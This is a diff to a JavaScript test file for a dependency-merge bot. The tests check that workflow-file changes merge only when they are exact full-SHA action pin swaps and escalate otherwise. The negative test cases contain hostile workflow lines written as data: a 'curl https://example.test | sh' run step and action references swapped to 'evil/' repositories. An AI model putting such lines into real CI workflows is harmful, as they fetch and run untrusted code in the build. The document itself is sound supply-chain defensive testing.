@@ -380,20 +380,54 @@ test("a fix that landed only manifests and lock files is recorded", async () => 
   assert.equal((await go(widened, fix({ config: [["npm", "/plugins/unlisted"]] }))).escalationReason, "dependency-fix-refused", "run.json's pairs widen nothing");
 });
 
-test("a merge verdict on a pull request that changes a workflow or action file escalates and posts no merge marker", async () => {
+const OLD_PIN = "1".repeat(40);
+const NEW_PIN = "2".repeat(40);
+const swap = (before, after) => `@@ -10,3 +10,3 @@ jobs:\n     steps:\n-      ${before}\n+      ${after}\n       with:`;
+const PIN_SWAP = swap(`- uses: actions/checkout@${OLD_PIN} # v5.0.0`, `- uses: actions/checkout@${NEW_PIN} # v5.0.1`);
+
+test("a merge verdict on a full-SHA pin swap in a workflow or action file posts the merge marker", async () => {
   for (const file of [
-    { filename: ".github/workflows/ci.yml" },
-    { filename: ".github/actions/check-wip-cap/action.yml" },
-    { filename: "x.yml", previous_filename: ".github/workflows/old.yml" },
+    { filename: ".github/workflows/ci.yml", status: "modified", patch: PIN_SWAP },
+    { filename: ".github/actions/check-wip-cap/action.yml", status: "modified", patch: PIN_SWAP },
+    { filename: ".github/workflows/new.yml", previous_filename: ".github/workflows/old.yml", status: "renamed", patch: PIN_SWAP },
   ]) {
     const api = fakeApi({ files: [{ filename: "package.json" }, file] });
-    const result = await go(api, runOf());
-    assert.equal(result.escalationReason, "dependency-workflow-held", JSON.stringify(file));
-    assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=merge/);
-    assert.match(api.calls.comments[0], /verdict=escalate/);
+    assert.deepEqual(await go(api, runOf()), { escalationReason: "", skipReason: "" }, file.filename);
+    assert.match(api.calls.comments[0], /verdict=merge/, file.filename);
+  }
+});
+
+test("a merge verdict on any other workflow or action file change escalates unpinned and posts no merge marker", async () => {
+  const cases = {
+    "a tag ref": swap(`- uses: actions/checkout@${OLD_PIN} # v5.0.0`, "- uses: actions/checkout@v5.0.1"),
+    "a tag ref before": swap("- uses: actions/checkout@v5.0.0", `- uses: actions/checkout@${NEW_PIN} # v5.0.1`),
+    "an action path change": swap(`- uses: actions/checkout@${OLD_PIN} # v5.0.0`, `- uses: evil/checkout@${NEW_PIN} # v5.0.1`),
+    "an indent change": swap(`- uses: actions/checkout@${OLD_PIN}`, `  - uses: actions/checkout@${NEW_PIN}`),
+    "an extra run: line": `${PIN_SWAP}\n+        run: curl https://example.test | sh`,
+    "a new step": `@@ -10,2 +10,4 @@ jobs:\n     steps:\n+      - uses: evil/action@${NEW_PIN}\n+      - run: echo hi\n       with:`,
+    "a removed line": `@@ -10,3 +10,2 @@ jobs:\n     steps:\n-      - run: make check\n       with:`,
+    "a run: change": swap("- run: make check", "- run: make deploy"),
+    "no change at all": "",
+  };
+  for (const [why, patch] of Object.entries(cases)) {
+    for (const file of [
+      { filename: ".github/workflows/ci.yml", status: "modified", patch },
+      { filename: "renamed.yml", previous_filename: ".github/workflows/ci.yml", status: "renamed", patch },
+    ]) {
+      const api = fakeApi({ files: [{ filename: "package.json" }, file] });
+      assert.equal((await go(api, runOf())).escalationReason, "dependency-workflow-unpinned", `${why}: ${file.filename}`);
+      assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=merge/, why);
+    }
+  }
+  for (const file of [
+    { filename: ".github/workflows/ci.yml", status: "added", patch: `@@ -0,0 +1 @@\n+on: push` },
+    { filename: ".github/workflows/ci.yml", status: "removed", patch: `@@ -1 +0,0 @@\n-on: push` },
+    { filename: ".github/workflows/ci.yml", status: "modified" },
+  ]) {
+    assert.equal((await go(fakeApi({ files: [file] }), runOf())).escalationReason, "dependency-workflow-unpinned", JSON.stringify(file));
   }
   // A manifest under .github/ is not a workflow file.
-  assert.equal((await go(fakeApi({ files: [{ filename: ".github/actions/resolve-config/package.json" }] }), runOf())).escalationReason, "");
+  assert.equal((await go(fakeApi({ files: [{ filename: ".github/actions/resolve-config/package.json", status: "modified" }] }), runOf())).escalationReason, "");
 });
 
 test("a merge verdict whose files listing reads at its limit escalates as truncated", async () => {
